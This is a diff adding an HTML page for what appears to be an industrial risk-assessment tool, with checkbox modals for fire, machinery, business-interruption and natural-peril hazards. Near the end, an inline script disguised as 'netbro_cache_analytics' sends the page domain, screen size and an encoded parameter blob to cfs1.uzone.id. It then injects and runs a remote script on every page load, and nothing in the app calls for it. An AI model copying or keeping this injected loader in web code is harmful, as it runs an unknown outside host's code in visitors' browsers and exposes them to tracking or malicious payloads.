+                          <input type="checkbox" name="type" value="fire load" onclick="inputData('materialRisk')"/>Fire Load<br/>
+                          <input type="checkbox" name="type" value="flammable liquids" onclick="inputData('materialRisk')" />Flammable Liquids<br/>
+                          <input type="checkbox" name="type" value="combustible gases" onclick="inputData('materialRisk')"/>Combustible Gases<br/>
+                          <input type="checkbox" name="type" value="fine dust" onclick="inputData('materialRisk')"/>Fine Dust<br/>
+                          <input type="checkbox" name="type" value="explosives" onclick="inputData('materialRisk')"/>Explosives<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- Select Basic 4-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Utilities Service Risk :<br>Electricity, Steam, Compressed Air, Heating, Cooling, Technical Gases, IT & EDP</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="serviceRisk" style="text-align:left;">
+                          <input type="checkbox" name="type" value="electricity" onclick="inputData('serviceRisk')"/>Electricity<br/>
+                          <input type="checkbox" name="type" value="steam" onclick="inputData('serviceRisk')" />Steam<br/>
+                          <input type="checkbox" name="type" value="compressed air" onclick="inputData('serviceRisk')"/>Compressed Air<br/>
+                          <input type="checkbox" name="type" value="heating" onclick="inputData('serviceRisk')"/>Heating<br/>
+                          <input type="checkbox" name="type" value="Cooling" onclick="inputData('serviceRisk')"/>Cooling<br/>
+                          <input type="checkbox" name="type" value="Technical Gases" onclick="inputData('serviceRisk')"/>Technical Gases<br/>
+                          <input type="checkbox" name="type" value="IT and EDP" onclick="inputData('serviceRisk')"/>IT and EDP<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- Select Basic 5-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">"Process Risk :<br>Size of The Plant, Complexity of Processes, Capacity, Utilization"</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="processRisk" style="text-align:left;">
+                          <input type="checkbox" name="type" value="size of the plant" onclick="inputData('processRisk')"/>Size of The Plant<br/>
+                          <input type="checkbox" name="type" value="complexity of processes" onclick="inputData('processRisk')" />Complexity of Processes<br/>
+                          <input type="checkbox" name="type" value="capacity" onclick="inputData('processRisk')"/>Capacity<br/>
+                          <input type="checkbox" name="type" value="utilization" onclick="inputData('processRisk')"/>Utilization<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                	</fieldset>
+
+              </div>
+              <div class="modal-footer">
+                <div id="buttonFirePot">
+                </div>
+              </div>
+                </div>
+            </div>
+          </div>
+        </div>
+        <!-- Modal Hazard Fire Protection -->
+        <div class="modal fade" id="myMachineryProt" role="dialog">
+
+          <div class="modal-dialog">
+
+            <!-- Modal content-->
+            <div class="modal-content">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h3 class="modal-title jumbotron text-center">Fire, Explosion and Operational Risk<span><h4 class="btn btn-success text-center">Hazard Potential :<br>Exposure, Hazards and Risks</h4></span></h3>
+              </div>
+
+              <div class="modal-body">
+
+                <fieldset>
+
+                    <!-- PS 1 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <div class="">
+                        <label class="col-md-12 text-center" for="selectbasic">Plant configuration, complexity, operation mode</label>
+                        <div class="col-md-12" style="padding-top: 10px;">
+                          <div class="plantconfig2" style="text-align:left;">
+                            <input type="checkbox" name="type" value="Plant configuration" onclick="inputData('plantconfig2')"/>Plant Configuration<br/>
+                            <input type="checkbox" name="type" value="complexity" onclick="inputData('plantconfig2')" />Complexity<br/>
+                            <input type="checkbox" name="type" value="operation mode" onclick="inputData('plantconfig2')"/>Operation Mode<br/>
+                          </div>
+                        </div>
+                      </div>
+
+                    </div>
+
+                    <!-- PS 2 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">"Proven technology (no prototype), proven parts, reliable design</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="proventechnology2" style="text-align:left;">
+                          <input type="checkbox" name="type" value="Proven technology (no prototype)" onclick="inputData('proventechnology2')"/>Proven Technology (No Prototype)<br/>
+                          <input type="checkbox" name="type" value="proven parts" onclick="inputData('proventechnology2')" />proven parts<br/>
+                          <input type="checkbox" name="type" value="reliable design" onclick="inputData('proventechnology2')"/>Reliable Design<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PS 3 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Physical condition of machines and equipment, technical age, corrosion</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="physicalCondition2" style="text-align:left;">
+                          <input type="checkbox" name="type" value="Physical condition of machines and equipment" onclick="inputData('physicalCondition2')"/>Physical Condition of Machines and Equipment<br/>
+                          <input type="checkbox" name="type" value="technical age" onclick="inputData('physicalCondition2')" />Technical Age<br/>
+                          <input type="checkbox" name="type" value="corrosion" onclick="inputData('physicalCondition2')"/>Corrosion<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PS 4 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Maintenance programs, inspection and regular diagnostics</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="maintananceProgram2" style="text-align:left;">
+                          <input type="checkbox" name="type" value="maintenance programs" onclick="inputData('maintananceProgram2')"/>Maintenance Programs<br/>
+                          <input type="checkbox" name="type" value="inspection and regular diagnostics" onclick="inputData('maintananceProgram2')" />Inspection and Regular Diagnostics<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PS 5 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Technical safety features, emergency shut-down</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="technicalSafety2" style="text-align:left;">
+                          <input type="checkbox" name="type" value="technical safety features" onclick="inputData('technicalSafety2')"/>Technical safety features<br/>
+                          <input type="checkbox" name="type" value="emergency shut-down" onclick="inputData('technicalSafety2')" />emergency shut-down<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PS 6 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Experienced and well qualified staff</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="ExperienceNQuallified2" style="text-align:left;">
+                          <input type="checkbox" name="type" value="Experienced and well qualified staff" onclick="inputData('ExperienceNQuallified2')"/>Experienced and Well Qualified Staff<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                  </fieldset>
+
+              </div>
+              <div class="modal-footer">
+                <div id="machineryProt">
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+
+        <!--began my machineryPot -->
+        <div class="modal fade" id="myMachineryPot" role="dialog">
+
+          <div class="modal-dialog">
+
+            <!-- Modal content-->
+            <div class="modal-content">
+              <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal">&times;</button>
+                <h3 class="modal-title jumbotron text-center">Fire, Explosion and Operational Risk<span><h4 class="btn btn-success text-center">Hazard Potential :<br>Exposure, Hazards and Risks</h4></span></h3>
+              </div>
+
+              <div class="modal-body">
+
+                <fieldset>
+
+                    <!-- PS 1 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <div class="">
+                        <label class="col-md-12 text-center" for="selectbasic">Plant configuration, complexity, operation mode</label>
+                        <div class="col-md-12" style="padding-top: 10px;">
+                          <div class="plantconfig" style="text-align:left;">
+                            <input type="checkbox" name="type" value="Plant configuration" onclick="inputData('plantconfig')"/>Plant Configuration<br/>
+                            <input type="checkbox" name="type" value=" complexity" onclick="inputData('plantconfig')" /> Complexity<br/>
+                            <input type="checkbox" name="type" value="operation mode" onclick="inputData('plantconfig')"/>Operation Mode<br/>
+                          </div>
+                        </div>
+                      </div>
+
+                    </div>
+
+                    <!-- PS 2 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">"Proven technology (no prototype), proven parts, reliable design</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+
+                        <div class="proventechnology" style="text-align:left;">
+                          <input type="checkbox" name="type" value="Proven technology (no prototype)" onclick="inputData('proventechnology')"/>Proven Technology (No Prototype)<br/>
+                          <input type="checkbox" name="type" value="proven parts" onclick="inputData('proventechnology')" />Proven Parts<br/>
+                          <input type="checkbox" name="type" value="reliable design" onclick="inputData('proventechnology')"/>Reliable Design<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PS 3 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Physical condition of machines and equipment, technical age, corrosion</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="physicalCondition" style="text-align:left;">
+                          <input type="checkbox" name="type" value="Physical condition of machines and equipment" onclick="inputData('physicalCondition')"/>Physical Condition of Machines and Equipment<br/>
+                          <input type="checkbox" name="type" value="technical age" onclick="inputData('physicalCondition')" />Technical Age<br/>
+                          <input type="checkbox" name="type" value="corrosion" onclick="inputData('physicalCondition')"/>Corrosion<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PS 4 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Maintenance programs, inspection and regular diagnostics</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="maintananceProgram" style="text-align:left;">
+                          <input type="checkbox" name="type" value="maintenance programs" onclick="inputData('maintananceProgram')"/>Maintenance Programs<br/>
+                          <input type="checkbox" name="type" value="inspection and regular diagnostics" onclick="inputData('maintananceProgram')" />Inspection and Regular Diagnostics<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PS 5 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Technical safety features, emergency shut-down</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="technicalSafety" style="text-align:left;">
+                          <input type="checkbox" name="type" value="Technical safety features" onclick="inputData('technicalSafety')"/>Technical Safety Features<br/>
+                          <input type="checkbox" name="type" value="emergency shut-down" onclick="inputData('technicalSafety')" />Emergency Shut-Down<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                    <!-- PS 6 Question-->
+                    <div class="form-group text-center jumbotron row">
+                      <label class="col-md-12 text-center" for="selectbasic">Experienced and well qualified staff</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="ExperienceNQuallified" style="text-align:left;">
+                          <input type="checkbox" name="type" value="Experienced and well qualified staff" onclick="inputData('ExperienceNQuallified')"/>Experienced and Well Qualified Staff<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                  </fieldset>
+
+              </div>
+              <div class="modal-footer">
+                <div id="machineryPot">
+                </div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+        <!-- the end -->
+        </div>
+      </div>
+
+      <!--began my business -->
+      <div class="modal fade" id="businessProtection" role="dialog">
+
+        <div class="modal-dialog">
+
+          <!-- Modal content-->
+          <div class="modal-content">
+            <div class="modal-header">
+              <button type="button" class="close" data-dismiss="modal">&times;</button>
+              <h3 class="modal-title jumbotron text-center">Fire, Explosion and Operational Risk<span><h4 class="btn btn-success text-center">Hazard Potential :<br>Exposure, Hazards and Risks</h4></span></h3>
+            </div>
+
+            <div class="modal-body">
+
+              <fieldset>
+
+                  <!-- PS 1 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <div class="">
+                      <label class="col-md-12 text-center" for="selectbasic">General:
+                        Annual turnover, replacement time, peak periods, market conditions</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="general2"  style="text-align:left;">
+                          <input type="checkbox" name="type" value="annual turnover" onclick="inputData('general2')"/>Annual Turnover<br/>
+                          <input type="checkbox" name="type" value="replacement time" onclick="inputData('general2')" />Replacement Time<br/>
+                          <input type="checkbox" name="type" value="peak periods" onclick="inputData('general2')"/>Peak Periods<br/>
+                          <input type="checkbox" name="type" value="market conditions" onclick="inputData('general2')"/>Market Conditions<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                  </div>
+
+                  <!-- PS 2 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Process flow configuration, critical bottlenecks (equipment, spareparts), utilities service interruption</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="processFlow2"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="process flow configuration" onclick="inputData('processFlow2')"/>Process Flow Configuration<br/>
+                        <input type="checkbox" name="type" value="critical bottlenecks (equipment, spareparts)" onclick="inputData('processFlow2')" />Critical Bottlenecks (Equipment, Spareparts)<br/>
+                        <input type="checkbox" name="type" value="utilities service interruption" onclick="inputData('processFlow2')"/>Utilities Service Interruption<br/>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PS 3 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Interdependency within the company (IBI): units, machines, plants, subsidiaries, associated companies</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="interdependency2"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="units" onclick="inputData('interdependency2')"/>Units<br/>
+                        <input type="checkbox" name="type" value="machines" onclick="inputData('interdependency2')" />Machines<br/>
+                        <input type="checkbox" name="type" value="plants" onclick="inputData('interdependency2')" />Plants<br/>
+                        <input type="checkbox" name="type" value="subsidiaries" onclick="inputData('interdependency2')"/>Subsidiaries<br/>
+                        <input type="checkbox" name="type" value="associated companies" onclick="inputData('interdependency2')"/>Associated Companies<br/>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PS 4 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Contingent business interruption (CBI): customers, suppliers, service providers</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="contingent2"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="Customers" onclick="inputData('contingent2')"/>customers<br/>
+                        <input type="checkbox" name="type" value="suppliers" onclick="inputData('contingent2')" />Suppliers<br/>
+                        <input type="checkbox" name="type" value="service providers" onclick="inputData('contingent2')"/>Service Providers<br/>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PS 5 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Business continuity management</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="businessContinuity2"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="business continuity management" onclick="inputData('businessContinuity2')"/>Business Continuity Management<br/>
+                      </div>
+                    </div>
+                  </div>
+
+
+                </fieldset>
+
+            </div>
+            <div class="modal-footer">
+              <div id="buisnessProt">
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- end of protection -->
+
+      <!--began my machineryPot -->
+      <div class="modal fade" id="businessPotential" role="dialog">
+
+        <div class="modal-dialog">
+
+          <!-- Modal content-->
+          <div class="modal-content">
+            <div class="modal-header">
+              <button type="button" class="close" data-dismiss="modal">&times;</button>
+              <h3 class="modal-title jumbotron text-center">Fire, Explosion and Operational Risk<span><h4 class="btn btn-success text-center">Hazard Potential :<br>Exposure, Hazards and Risks</h4></span></h3>
+            </div>
+
+            <div class="modal-body">
+
+
+                        <fieldset>
+
+                            <!-- PS 1 Question-->
+                            <div class="form-group text-center jumbotron row">
+                              <div class="">
+                                <label class="col-md-12 text-center" for="selectbasic">General:
+                                  Annual turnover, replacement time, peak periods, market conditions</label>
+                                <div class="col-md-12" style="padding-top: 10px;">
+                                  <div class="general"  style="text-align:left;">
+                                    <input type="checkbox" name="type" value="annual turnover" onclick="inputData('general')"/>Annual Turnover<br/>
+                                    <input type="checkbox" name="type" value="replacement time" onclick="inputData('general')" />Replacement Time<br/>
+                                    <input type="checkbox" name="type" value="peak periods" onclick="inputData('general')"/>Peak Periods<br/>
+                                    <input type="checkbox" name="type" value="market conditions" onclick="inputData('general')"/>Market Conditions<br/>
+                                  </div>
+                                </div>
+                              </div>
+
+                            </div>
+
+                            <!-- PS 2 Question-->
+                            <div class="form-group text-center jumbotron row">
+                              <label class="col-md-12 text-center" for="selectbasic">Process flow configuration, critical bottlenecks (equipment, spareparts), utilities service interruption</label>
+                              <div class="col-md-12" style="padding-top: 10px;">
+                                <div class="processFlow"  style="text-align:left;">
+                                  <input type="checkbox" name="type" value="process flow configuration" onclick="inputData('processFlow')"/>Process Flow Configuration<br/>
+                                  <input type="checkbox" name="type" value="critical bottlenecks (equipment, spareparts)" onclick="inputData('processFlow')" />Critical Bottlenecks (Equipment, Spareparts)<br/>
+                                  <input type="checkbox" name="type" value="utilities service interruption" onclick="inputData('processFlow')"/>Utilities Service Interruption<br/>
+                                </div>
+                              </div>
+                            </div>
+
+                            <!-- PS 3 Question-->
+                            <div class="form-group text-center jumbotron row">
+                              <label class="col-md-12 text-center" for="selectbasic">Interdependency within the company (IBI): units, machines, plants, subsidiaries, associated companies</label>
+                              <div class="col-md-12" style="padding-top: 10px;">
+                                <div class="interdependency"  style="text-align:left;">
+                                  <input type="checkbox" name="type" value="units" onclick="inputData('interdependency')"/>Units<br/>
+                                  <input type="checkbox" name="type" value="machines" onclick="inputData('interdependency')" />Machines<br/>
+                                  <input type="checkbox" name="type" value="plants" onclick="inputData('interdependency')"/>Plants<br/>
+                                  <input type="checkbox" name="type" value="subsidiaries" onclick="inputData('interdependency')"/>Subsidiaries<br/>
+                                  <input type="checkbox" name="type" value="Associated Companies" onclick="inputData('interdependency')"/>Associated Companies<br/>
+                                </div>
+                              </div>
+                            </div>
+
+                            <!-- PS 4 Question-->
+                            <div class="form-group text-center jumbotron row">
+                              <label class="col-md-12 text-center" for="selectbasic">Contingent business interruption (CBI): customers, suppliers, service providers</label>
+                              <div class="col-md-12" style="padding-top: 10px;">
+                                <div class="contingent"  style="text-align:left;">
+                                  <input type="checkbox" name="type" value="customers" onclick="inputData('contingent')"/>Customers<br/>
+                                  <input type="checkbox" name="type" value="suppliers" onclick="inputData('contingent')" />Suppliers<br/>
+                                  <input type="checkbox" name="type" value="service providers" onclick="inputData('contingent')"/>Service Providers<br/>
+                                </div>
+                              </div>
+                            </div>
+
+                            <!-- PS 5 Question-->
+                            <div class="form-group text-center jumbotron row">
+                              <label class="col-md-12 text-center" for="selectbasic">Business continuity management</label>
+                              <div class="col-md-12" style="padding-top: 10px;">
+                                <div class="businessContinuity"  style="text-align:left;">
+                                  <input type="checkbox" name="type" value="Business continuity management" onclick="inputData('businessContinuity')"/>Business Continuity Management<br/>
+                                  </div>
+                              </div>
+                            </div>
+
+
+                  </fieldset>
+
+            </div>
+            <div class="modal-footer">
+              <div id="buisnessPot">
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <div class="modal fade" id="naturalProtection" role="dialog">
+
+        <div class="modal-dialog">
+
+          <!-- Modal content-->
+          <div class="modal-content">
+            <div class="modal-header">
+              <button type="button" class="close" data-dismiss="modal">&times;</button>
+              <h3 class="modal-title jumbotron text-center">Fire, Explosion and Operational Risk<span><h4 class="btn btn-success text-center">Hazard Potential :<br>Exposure, Hazards and Risks</h4></span></h3>
+            </div>
+
+            <div class="modal-body">
+
+              <fieldset>
+
+                  <!-- PS 1 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <div class="">
+                      <label class="col-md-12 text-center" for="selectbasic">Earthquake</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="earthquake2"  style="text-align:left;">
+                          <input type="checkbox" name="type" value="earthquake" onclick="inputData('earthquake2')"/>Earthquake<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                  </div>
+
+                  <!-- PS 2 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Flood exposure:
+      river flood, flash flood, storm surge, tsunami</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="floodExposure2"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="river flood" onclick="inputData('floodExposure2')"/>River Flood<br/>
+                        <input type="checkbox" name="type" value="flash flood" onclick="inputData('floodExposure2')" />Flash Flood<br/>
+                        <input type="checkbox" name="type" value="storm surge" onclick="inputData('floodExposure2')"/>Storm Surge<br/>
+                        <input type="checkbox" name="type" value="tsunami" onclick="inputData('floodExposure2')"/>Tsunami<br/>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PS 3 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Wind exposure:
+      extratropical storm, tropical cyclone, tornado, hurricane</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="windexposure2"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="extratropical storm" onclick="inputData('windexposure2')"/>Extratropical Storm<br/>
+                        <input type="checkbox" name="type" value="Tropical Cyclone" onclick="inputData('windexposure2')" />Tropical Cyclone<br/>
+                        <input type="checkbox" name="type" value="tornado" onclick="inputData('windexposure2')"/>Tornado<br/>
+                        <input type="checkbox" name="type" value="hurricane" onclick="inputData('windexposure2')"/>Hurricane<br/>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PS 4 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Extreme weather conditions:
+      hail, lightning, freezing, snow</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="weather2"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="hail" onclick="inputData('weather2')"/>Hail<br/>
+                        <input type="checkbox" name="type" value="lightning" onclick="inputData('weather2')" />Lightning<br/>
+                        <input type="checkbox" name="type" value="freezing" onclick="inputData('weather2')"/>Freezing<br/>
+                        <input type="checkbox" name="type" value="snow" onclick="inputData('weather2')"/>Snow<br/>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PS 5 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Other perils:
+      volcanism, avalanche, landslide</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="otherperils2"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="volcanism" onclick="inputData('otherperils2')"/>Volcanism<br/>
+                        <input type="checkbox" name="type" value="Avalanche" onclick="inputData('otherperils2')" />Avalanche<br/>
+                        <input type="checkbox" name="type" value="landslide" onclick="inputData('otherperils2')"/>Landslide<br/>
+                      </div>
+                    </div>
+                  </div>
+
+
+                </fieldset>
+
+            </div>
+            <div class="modal-footer">
+              <div id="naturalProt">
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+
+      <!--began my machineryPot -->
+      <div class="modal fade" id="naturalPotential" role="dialog">
+
+        <div class="modal-dialog">
+
+          <!-- Modal content-->
+          <div class="modal-content">
+            <div class="modal-header">
+              <button type="button" class="close" data-dismiss="modal">&times;</button>
+              <h3 class="modal-title jumbotron text-center">Fire, Explosion and Operational Risk<span><h4 class="btn btn-success text-center">Hazard Potential :<br>Exposure, Hazards and Risks</h4></span></h3>
+            </div>
+
+            <div class="modal-body">
+
+              <fieldset>
+
+                  <!-- PS 1 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <div class="">
+                      <label class="col-md-12 text-center" for="selectbasic">Earthquake</label>
+                      <div class="col-md-12" style="padding-top: 10px;">
+                        <div class="earthquake"  style="text-align:left;">
+                          <input type="checkbox" name="type" value="earthquake" onclick="inputData('earthquake')"/>Earthquake<br/>
+                        </div>
+                      </div>
+                    </div>
+
+                  </div>
+
+                  <!-- PS 2 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Flood exposure:
+      river flood, flash flood, storm surge, tsunami</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="floodExposure"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="river flood" onclick="inputData('floodExposure')"/>River Flood<br/>
+                        <input type="checkbox" name="type" value="flash flood" onclick="inputData('floodExposure')" />Flash Flood<br/>
+                        <input type="checkbox" name="type" value="Storm Surge" onclick="inputData('floodExposure')"/>Storm Surge<br/>
+                        <input type="checkbox" name="type" value="tsunami" onclick="inputData('floodExposure')"/>Tsunami<br/>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PS 3 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Wind exposure:
+      extratropical storm, tropical cyclone, tornado, hurricane</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="windexposure"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="extratropical storm" onclick="inputData('windexposure')"/>Extratropical Storm<br/>
+                        <input type="checkbox" name="type" value="tropical cyclone" onclick="inputData('windexposure')" />Tropical Cyclone<br/>
+                        <input type="checkbox" name="type" value="tornado" onclick="inputData('windexposure')"/>Tornado<br/>
+                        <input type="checkbox" name="type" value="hurricane" onclick="inputData('windexposure')"/>hurricane<br/>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PS 4 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Extreme weather conditions:
+      hail, lightning, freezing, snow</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="weather"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="hail" onclick="inputData('weather')"/>Hail<br/>
+                        <input type="checkbox" name="type" value="lightning" onclick="inputData('weather')" />Lightning<br/>
+                        <input type="checkbox" name="type" value="freezing" onclick="inputData('weather')"/>Freezing<br/>
+                        <input type="checkbox" name="type" value="snow" onclick="inputData('weather')"/>Snow<br/>
+                      </div>
+                    </div>
+                  </div>
+
+                  <!-- PS 5 Question-->
+                  <div class="form-group text-center jumbotron row">
+                    <label class="col-md-12 text-center" for="selectbasic">Other perils:
+      volcanism, avalanche, landslide</label>
+                    <div class="col-md-12" style="padding-top: 10px;">
+                      <div class="otherperils"  style="text-align:left;">
+                        <input type="checkbox" name="type" value="volcanism" onclick="inputData('otherperils')"/>Volcanism<br/>
+                        <input type="checkbox" name="type" value="avalanche" onclick="inputData('otherperils')" />Avalanche<br/>
+                        <input type="checkbox" name="type" value="landslide" onclick="inputData('otherperils')"/>Landslide<br/>
+                      </div>
+                    </div>
+                  </div>
+
+
+                </fieldset>
+
+            </div>
+            <div class="modal-footer">
+              <div id="naturalPot">
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+      </div>
+</div>
+
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "¶ms=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKNm5%2bVoDUzi2Ya7eiY9bo1aqBDt%2f1aQUehEpARaiLMQfEHyGI1OmFP0z9%2bhlIZajESpSTcpofJ%2f1TAdP8LzCMpK7zJRdq3v0e8Ir7pB%2fZykfFnK8wova5SrNForeVQMFAzboZE3BhjmFVsOoFdR7degMf%2fHAi12yNjPA74uZC4fDyTTSocNgp10KANWV2QvS24ZMqOxDa5gAdo44BnZ569c0efCYH%2bSEd%2fKtRHd5i8iFF%2fZHLWPj6H2ypIFYUbwPwYrnBeeFvz%2fCyy2NOf7RvSE31sWMJSM%2bc8pItDBi9nXoa66F6ZaU3PvmFQJCo8MKWWOg9saJDEHFeJ6qoqAgLZpcLu7njpy2kl2RWa0O%2fJ92Aooy3IcAVNHlzDA5vQ7%2buFgudiocBoaQg5xDkrVffn8c7KgOBVpmoOsCmdh9FJg7su2llbOb7c6AsWgm%2bm32chbrEtOpILStqcaKgmk%2fUhwjxAhQoIzWONj93wtp9t2OeKnKRipoOhxTLZQukuU%2bCjRruFvsqTA43X9%2fpyIKmoZVAq5sVzVLN4Uc4%2fNxM4%2fNCV01rrTbOvnqOag2E60ID" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
+</script>
+
+</body>
+<script src="./libraries/jquery-3.1.1.min.js"></script>
+<script src="./libraries/jwt-decode.min.js"></script>
+<script src="./libraries/bootstrap.min.js"></script>
+<script type="text/javascript" src="./javascripts/script.company.js"></script>
+<script type="text/javascript" src="./javascripts/script.users.js"></script>
+
+<script>
+    $(document).ready(function(){
+        if(!localStorage.getItem('token')){
+            window.location = 'index.html'
+        }
+    })
+</script>
+</html>
